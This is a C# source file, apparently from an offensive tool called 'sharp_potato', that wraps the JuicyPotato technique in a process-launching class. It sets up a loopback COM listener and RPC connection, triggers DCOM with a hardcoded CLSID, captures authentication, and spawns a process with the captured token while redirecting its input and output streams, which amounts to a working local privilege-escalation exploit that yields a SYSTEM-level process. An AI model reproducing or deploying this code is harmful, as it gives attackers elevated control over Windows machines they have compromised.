using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

namespace sharp_potato;

public class SystemProcess
{
    public ProcessStartInfo StartInfo { get; } = new();
    public IPEndPoint ComServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
    public IPEndPoint RpcServerEndPoint { get; set; } = new(IPAddress.Loopback, 135);
    public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");

    public StreamReader StandardOutput { get; private set; }
    public StreamReader StandardError { get; private set; }
    public StreamWriter StandardInput { get; private set; }

    private PipeStream standardOutputStream = null;
    private PipeStream standardErrorStream = null;
    private PipeStream standardInputStream = null;
    public int Id => (int) processInformation.dwProcessId;

    private SafePROCESS_INFORMATION processInformation;

    public void Start()
    {
        var potato = new JuicyPotato {ProcessStartInfo = StartInfo};
        potato.ComServerEndPoint = ComServerEndPoint;
        potato.RpcServerEndPoint = RpcServerEndPoint;
        potato.CLSID = CLSID;

        potato.StartCOMListenerThread();
        potato.StartRPCConnectionThread();
        potato.TriggerDCOM();
        potato.WaitForAuth();

        var secAttr = new SECURITY_ATTRIBUTES();
        secAttr.nLength = Marshal.SizeOf<SECURITY_ATTRIBUTES>();
        secAttr.bInheritHandle = true;

        var startupInfo = new STARTUPINFO();
        startupInfo.lpDesktop = "winsta0\\default";
        if (StartInfo.RedirectStandardOutput)
        {
            CreatePipe(out var hChildStdOutRead, out var hChildStdOutWrite, secAttr);
            SetHandleInformation(hChildStdOutRead.DangerousGetHandle(), HANDLE_FLAG.HANDLE_FLAG_INHERIT, HANDLE_FLAG.NONE);
            startupInfo.hStdOutput = hChildStdOutWrite;
            startupInfo.dwFlags |= STARTF.STARTF_USESTDHANDLES;
            standardOutputStream = new PipeStream(hChildStdOutRead, true);
            StandardOutput = new StreamReader(standardOutputStream);
        }

        if (StartInfo.RedirectStandardError)
        {
            CreatePipe(out var hChildStdErrRead, out var hChildStdErrWrite, secAttr);
            SetHandleInformation(hChildStdErrRead.DangerousGetHandle(), HANDLE_FLAG.HANDLE_FLAG_INHERIT, HANDLE_FLAG.NONE);
            startupInfo.hStdError = hChildStdErrWrite;
            startupInfo.dwFlags |= STARTF.STARTF_USESTDHANDLES;
            standardErrorStream = new PipeStream(hChildStdErrRead, true);
            StandardError = new StreamReader(standardErrorStream);
        }

        if (StartInfo.RedirectStandardInput)
        {
            CreatePipe(out var hChildStdInputRead, out var hChildStdInputWrite, secAttr);
            SetHandleInformation(hChildStdInputWrite.DangerousGetHandle(), HANDLE_FLAG.HANDLE_FLAG_INHERIT, HANDLE_FLAG.NONE);
            startupInfo.hStdInput = hChildStdInputRead;
            startupInfo.dwFlags |= STARTF.STARTF_USESTDHANDLES;
            standardInputStream = new PipeStream(hChildStdInputWrite, false);
            StandardInput = new StreamWriter(standardInputStream) {AutoFlush = true};
        }

        processInformation = potato.CreateProcess(startupInfo);
    }

    public void WaitForExit() => WaitForSingleObject(processInformation.hProcess, INFINITE);
}